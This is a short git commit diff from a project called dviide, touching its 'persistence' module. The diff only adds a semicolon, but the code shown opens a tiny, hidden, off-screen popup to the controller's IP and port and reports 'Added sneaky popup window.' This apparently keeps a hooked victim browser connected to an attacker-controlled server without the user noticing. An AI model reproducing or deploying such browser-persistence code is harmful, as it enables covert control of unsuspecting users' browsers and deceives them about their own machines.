1cb4ec4ee22d8f06578bb21c7c59f835e21911e6
Vincent Brouwer <kipsensatie@gmail.com>
2017-06-09 22:25:39 +0200

    Updated persistence module

--- dviide_modules/persistence/main.js
+++ dviide_modules/persistence/main.js
@@ -1,4 +1,4 @@
-this.name = 'persistence'
+this.name = 'persistence';
 this.start = function() {
   window.open(dviide.ip + ':' + dviide.webport,'d','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,right='+screen.width+',top='+screen.height+'').blur();window.focus();
   dviide.callback('Added sneaky popup window. ' + dviide.ip);
